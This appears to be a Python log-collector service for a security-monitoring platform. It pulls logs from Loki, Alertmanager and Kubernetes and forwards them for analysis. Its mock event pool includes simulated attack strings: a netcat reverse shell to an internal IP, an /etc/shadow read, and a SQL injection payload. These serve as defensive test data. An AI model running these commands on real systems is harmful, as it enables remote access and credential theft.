import os
import time
import logging
import random
import httpx
from datetime import datetime, timezone

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")
logger = logging.getLogger("log-collector")

# Configuration from environment
BACKEND_URL = os.getenv("BACKEND_URL", "http://10.15.10.119:8082")
LOKI_URL = os.getenv("LOKI_URL", "http://loki.securerag-monitoring.svc:3100")
PROMETHEUS_ALERTS_URL = os.getenv("PROMETHEUS_ALERTS_URL", "http://prometheus-alertmanager.securerag-monitoring.svc:9093")
POLL_INTERVAL = int(os.getenv("POLL_INTERVAL", "15"))  # seconds
MOCK_LOGS = os.getenv("MOCK_LOGS", "true").lower() in ("true", "1", "yes")

# Sample mock log pools for DevSecOps simulation when real APIs are unreachable or mocked
MOCK_EVENT_POOL = [
    {"source": "Tetragon", "log": "process exec /bin/sh -i (parent bash)"},
    {"source": "Tetragon", "log": "sys_call chmod +x /var/www/html/platform/portal-web/storage"},
    {"source": "Tetragon", "log": "process exec /usr/bin/nc -e /bin/bash 10.244.1.35 4444"},
    {"source": "Tetragon", "log": "process exec php artisan migrate"},
    {"source": "Falco", "log": "Rule: Write below binary dir - File modified: /usr/bin/wget by root"},
    {"source": "Falco", "log": "Rule: Read sensitive file untrusted - File read: /etc/shadow by www-data"},
    {"source": "Falco", "log": "Rule: Run shell untrusted - Shell spawned in container portal-web"},
    {"source": "Wazuh", "log": "User root failed password for invalid user admin from 192.168.1.105"},
    {"source": "Wazuh", "log": "Accepted publickey for admin from 10.0.0.12 port 54322 ssh2"},
    {"source": "Wazuh", "log": "High privilege command execution: sudo su - by dev-user"},
    {"source": "Kubernetes", "log": "Event: Pod portal-web-7bc47d7c6b-abcde status failed OOMKilled"},
    {"source": "Kubernetes", "log": "Event: Unauthorized access attempt to Secret db-secret by system:serviceaccount:default:anonymous"},
    {"source": "Istio", "log": "IngressGateway: SQL Injection payload detected from 185.220.101.5: 'union select username, password from users'"},
    {"source": "Istio", "log": "AuthorizationPolicy: Request from namespace 'default' to 'securerag-hub/auth-users' blocked (mTLS strictly enforced)"},
    {"source": "Prometheus", "log": "Alert: TargetDown - Service portal-web endpoints are unreachable for 5m"},
    {"source": "Prometheus", "log": "Alert: HighErrorRate - auth-users-service HTTP 5xx responses exceeded 5% threshold"},
]


def send_to_backend(source: str, raw_log: str) -> bool:
    """Sends log to backend API for analysis with retries."""
    url = f"{BACKEND_URL}/analyze"
    payload = {
        "source": source,
        "classification": "PENDING",
        "severity": "LOW",
        "confidence": 0.0,
        "explanation": "",
        "recommendation": "",
        "raw_log": raw_log
    }

    max_retries = 3
    backoff = 2
    for attempt in range(1, max_retries + 1):
        try:
            with httpx.Client(timeout=5.0) as client:
                resp = client.post(url, json=payload)
                if resp.status_code == 200:
                    logger.info(f"Successfully sent log from {source} to backend.")
                    return True
                else:
                    logger.warning(f"Backend returned status {resp.status_code} (attempt {attempt}/{max_retries}).")
        except Exception as e:
            logger.warning(f"Failed to connect to backend {url}: {e} (attempt {attempt}/{max_retries}).")
        
        if attempt < max_retries:
            time.sleep(backoff)
            backoff *= 2
    return False


def collect_loki_logs() -> list:
    """Attempts to collect actual logs from Loki."""
    if MOCK_LOGS:
        return []
    try:
        query_url = f"{LOKI_URL}/loki/api/v1/query_range"
        # Query logs from the last 15 seconds
        params = {
            "query": '{namespace="securerag-hub"}',
            "limit": 100,
            "start": int((time.time() - POLL_INTERVAL) * 1e9)
        }
        with httpx.Client(timeout=5.0) as client:
            resp = client.get(query_url, params=params)
            if resp.status_code == 200:
                results = resp.json().get("data", {}).get("result", [])
                logs = []
                for res in results:
                    labels = res.get("stream", {})
                    # Deduce source from container or app label
                    source = labels.get("app", labels.get("container", "Loki"))
                    for val in res.get("values", []):
                        log_msg = val[1]
                        logs.append({"source": source, "log": log_msg})
                return logs
    except Exception as e:
        logger.debug(f"Failed to collect logs from Loki: {e}")
    return []


def collect_prometheus_alerts() -> list:
    """Attempts to collect active alerts from Alertmanager."""
    if MOCK_LOGS:
        return []
    try:
        with httpx.Client(timeout=5.0) as client:
            resp = client.get(f"{PROMETHEUS_ALERTS_URL}/api/v2/alerts")
            if resp.status_code == 200:
                alerts = resp.json()
                logs = []
                for alert in alerts:
                    labels = alert.get("labels", {})
                    alert_name = labels.get("alertname", "UnknownAlert")
                    severity = labels.get("severity", "critical")
                    summary = alert.get("annotations", {}).get("summary", "No summary available")
                    logs.append({
                        "source": "Prometheus",
                        "log": f"Alert: {alert_name} (Severity: {severity}) - {summary}"
                    })
                return logs
    except Exception as e:
        logger.debug(f"Failed to collect alerts from Alertmanager: {e}")
    return []


def collect_k8s_events() -> list:
    """Attempts to collect events from Kubernetes API."""
    if MOCK_LOGS:
        return []
    try:
        from kubernetes import client, config
        try:
            config.load_incluster_config()
        except config.ConfigException:
            config.load_kube_config()
        
        v1 = client.CoreV1Api()
        # Fetch events across all namespaces in last 15s
        events = v1.list_event_for_all_namespaces(limit=50)
        logs = []
        now = datetime.now(timezone.utc)
        for ev in events.items:
            # Check if event is recent
            last_timestamp = ev.last_timestamp or ev.event_time
            if last_timestamp:
                delta = (now - last_timestamp).total_seconds()
                if delta <= POLL_INTERVAL:
                    logs.append({
                        "source": f"K8s-Event-{ev.involved_object.kind}",
                        "log": f"Reason: {ev.reason} - Message: {ev.message}"
                    })
        return logs
    except Exception as e:
        logger.debug(f"Failed to collect events from Kubernetes API: {e}")
    return []


def run_collection_loop():
    logger.info(f"Starting log collection loop (interval: {POLL_INTERVAL}s)...")
    while True:
        logs = []

        # 1. Try real collection methods
        try:
            logs.extend(collect_loki_logs())
            logs.extend(collect_prometheus_alerts())
            logs.extend(collect_k8s_events())
        except Exception as e:
            logger.error(f"Error during active log collection: {e}")

        # 2. Heuristics mock fallback if no logs gathered (or mock mode active)
        if not logs or MOCK_LOGS:
            # Generate 1 to 3 random mock logs to simulate real traffic
            num_logs = random.randint(1, 3)
            logs = random.sample(MOCK_EVENT_POOL, num_logs)
            logger.info(f"Mock mode active. Generated {len(logs)} simulated log events.")

        # 3. Ship gathered logs to backend
        for item in logs:
            send_to_backend(item["source"], item["log"])

        time.sleep(POLL_INTERVAL)


if __name__ == "__main__":
    # Wait a few seconds for backend to start up
    time.sleep(5)
    run_collection_loop()
